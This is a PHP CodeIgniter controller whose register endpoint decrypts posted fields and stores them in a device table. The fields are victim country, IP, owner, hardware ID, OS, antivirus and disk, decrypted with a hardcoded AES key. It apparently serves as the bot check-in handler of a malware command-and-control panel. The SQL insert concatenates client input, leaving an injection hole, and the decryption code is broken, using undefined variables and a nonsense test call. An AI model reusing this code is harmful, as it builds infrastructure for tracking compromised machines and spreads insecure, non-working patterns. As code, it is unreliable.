<?php
/**
 * Created by PhpStorm.
 * User: wolf
 * Date: 10/6/14
 * Time: 2:26 AM
 */

if ( ! defined('BASEPATH')) exit('No direct script access allowed');
require_once FCPATH."application/models/aes/AesEncryption.class.php";
require_once FCPATH."system/libraries/Encrypt.php";
class main extends CI_Controller {

    public $data;
    public $aes_password = "password123";

    public function __construct(){
        parent::__construct();
        $this->load->helper('url');
        $this->load->helper('path');
        $this->output->set_content_type('application/json');
        header('Content-type: text/json');
    }
    
    public function index()
    {
        require_once FCPATH."api/api.php";
        require_once FCPATH.'ui/server/config.php';
        require_once FCPATH.'ui/server/user_manage.php';
        header("Content-Type: text/html;charset=utf-8");
        header("Content-Encoding: utf-8");
        $api = new AppApi();
        $api->response();
    }

    public function register(){
        $aes = new AesEncryption();

        $CIE = new CI_Encrypt();
        $Decrypted = "";//mcrypt_decrypt(MCRYPT_BLOWFISH, "asd", "123", MCRYPT_MODE_ECB, NULL);
        if (function_exists('mcrypt_encrypt')){
                $Decrypted = mcrypt_decrypt(MCRYPT_BLOWFISH, $Key, $LogData, MCRYPT_MODE_ECB, NULL);
        } else {
            $Decrypted = openssl_decrypt($LogData, 'BF-ECB', $Key, OPENSSL_RAW_DATA | OPENSSL_NO_PADDING);
        }

        $Decrypted = $CIE->mcrypt_decode("asd", "123");
        echo json_encode($Decrypted);
        $res['country'] = $aes->decrypt($this->input->post('a') , $this->aes_password);
        $res['ipaddress'] = $aes->decrypt($this->input->post('b') , $this->aes_password);
        $res['owner'] = $aes->decrypt($this->input->post('c') , $this->aes_password);
        $res['hwid'] = $aes->decrypt($this->input->post('d') , $this->aes_password);
        $res['date'] = $aes->decrypt($this->input->post('e') , $this->aes_password);
        $res['os'] = $aes->decrypt($this->input->post('f') , $this->aes_password);
        $res['av'] = $aes->decrypt($this->input->post('g') , $this->aes_password);
        $res['hdd'] = $aes->decrypt($this->input->post('h') , $this->aes_password);

        $CI =   & get_instance();
        $query = "insert into `device_tb` (`country`, `ipaddress`,  `owner`,  `hwid`,  `date`,  `os`,  `av`,  `hdd`) VALUES( '"
            .$res['country']."' , '".$res['ipaddress']."' , '".$res['owner']."' , '".$res['hwid']."' , '".$res['date']."' , '".$res['os']."' , '".$res['av']."' , '".$res['hdd']."');";
//        echo $query;
        $resQuery = $CI->db->query($query);
        echo json_encode($resQuery);
    }
}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */
